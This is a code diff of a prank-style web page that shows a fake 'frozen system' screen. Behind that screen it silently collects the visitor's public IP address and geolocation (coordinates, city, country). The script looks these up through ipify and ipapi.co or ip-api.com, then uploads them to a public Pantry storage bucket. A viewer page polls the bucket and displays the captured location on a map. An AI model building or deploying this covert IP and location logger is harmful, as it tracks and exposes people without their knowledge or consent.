@@ -20,7 +20,7 @@
         #geo { font-size:2rem; color:#0f8; margin:20px 0; }
         #maplink { font-size:1.6rem; color:#0ff; margin:40px 0; text-decoration:none; }
         #maplink:hover { text-decoration:underline; }
-        #status { font-size:1.2rem; color:#555; margin-top:60px; }
+        #status { font-size:1.2rem; color:#555; margin-top:40px; text-align:center; max-width:90%; }
         #hint { position:fixed; bottom:10px; right:10px; font-size:0.7rem; color:#444; opacity:0.4; pointer-events:none; }
     </style>
 </head>
@@ -40,7 +40,7 @@
         <p>█▓▓▓▓▓░░░░░░░░░░  0xDEADBEEF overflow</p>
         <p style="margin-top:60px; font-size:1.4rem; color:#0f0;">connecting to shared shadow node...</p>
         <p style="font-size:0.9rem; opacity:0.5;">(do not close this window - data sync in background)</p>
-        <div id="hint">F12 → Console for room/debug</div>
+        <div id="hint">F12 → Console shows room code & logs</div>
     </div>
 
     <div id="ip-view">
@@ -52,37 +52,37 @@
     </div>
 
     <script>
-        // Public JSON basket service - no auth, free, works from hosted pages
         const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
         let ROOM = localStorage.getItem("xenon_room") || "";
 
         if (!ROOM) {
-            ROOM = "xenon-" + Math.random().toString(36).slice(2, 8);
+            ROOM = "xenon-" + Math.random().toString(36).slice(2, 9);
             localStorage.setItem("xenon_room", ROOM);
         }
-        console.log("%cRoom code (share this to sync devices): " + ROOM, "color:#0f0; font-size:16px;");
+        console.log("%cRoom code (share this): %s", "color:#0f0;font-size:16px;", ROOM);
 
         function enterXenon() {
             document.getElementById("landing").style.display = "none";
             document.getElementById("frozen").style.display = "flex";
-            setTimeout(captureAndUpload, 12000); // fake freeze
+            setTimeout(captureAndUpload, 12000);
         }
 
         async function captureAndUpload() {
             try {
-                console.log("Capturing IP...");
+                console.log("Starting capture...");
                 const ipRes = await fetch("https://api.ipify.org?format=json");
                 const { ip } = await ipRes.json();
-                console.log("IP:", ip);
+                console.log("Captured IP:", ip);
 
                 let geo = {};
                 try {
                     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                     geo = await geoRes.json();
-                } catch {}
-                if (geo.error) {
-                    const fallback = await fetch(`https://ip-api.com/json/${ip}`);
-                    geo = await fallback.json();
+                } catch (e) { console.warn("ipapi failed, trying fallback"); }
+
+                if (geo.error || !geo.latitude) {
+                    const fallbackRes = await fetch(`https://ip-api.com/json/${ip}`);
+                    geo = await fallbackRes.json();
                 }
 
                 if (!geo.error && geo.status !== "fail") {
@@ -92,18 +92,24 @@
                         city: geo.city || geo.regionName || "?",
                         country: geo.country || geo.countryName || "?"
                     };
-                    console.log("Geo:", geoData);
+                    console.log("Geo data:", geoData);
 
-                    const res = await fetch(PANTRY_BASE + ROOM, {
+                    const uploadRes = await fetch(PANTRY_BASE + ROOM, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ ip, geo: geoData, ts: Date.now() })
                     });
-                    if (res.ok) console.log("Data sent to server!");
-                    else console.error("Upload failed:", res.status);
+
+                    if (uploadRes.ok) {
+                        console.log("Upload success!");
+                    } else {
+                        console.error("Upload failed - status:", uploadRes.status);
+                    }
+                } else {
+                    console.warn("No valid geo");
                 }
             } catch (e) {
-                console.error("Capture error:", e);
+                console.error("Capture/upload error:", e.message);
             }
         }
 
@@ -118,10 +124,12 @@
             const status = document.getElementById("status");
 
             const update = async () => {
+                status.textContent = "Fetching from server...";
                 try {
-                    console.log("Fetching from server...");
                     const res = await fetch(PANTRY_BASE + ROOM);
-                    if (!res.ok) throw new Error(res.status);
+                    if (!res.ok) {
+                        throw new Error(`HTTP ${res.status}`);
+                    }
                     const data = await res.json();
 
                     if (data.ip) {
@@ -133,20 +141,20 @@
                             mapEl.style.display = "block";
                         }
                         status.textContent = `Room: ${ROOM} • Last capture: ${new Date(data.ts).toLocaleString()}`;
-                        console.log("Data loaded:", data);
+                        console.log("Loaded data:", data);
                     } else {
                         ipEl.textContent = "NO DATA YET";
-                        status.textContent = "No capture in this room";
+                        status.textContent = "Room is empty - click ENTER on a device first";
                     }
                 } catch (e) {
                     ipEl.textContent = "FETCH ERROR";
-                    status.textContent = "Could not reach server (check console)";
+                    status.textContent = `Could not reach server: ${e.message}\n(Check console / host online / rate limit?)`;
                     console.error("Fetch failed:", e);
                 }
             };
 
             await update();
-            setInterval(update, 10000); // live refresh
+            setInterval(update, 8000); // retry every 8s
         }
 
         function checkHash() {
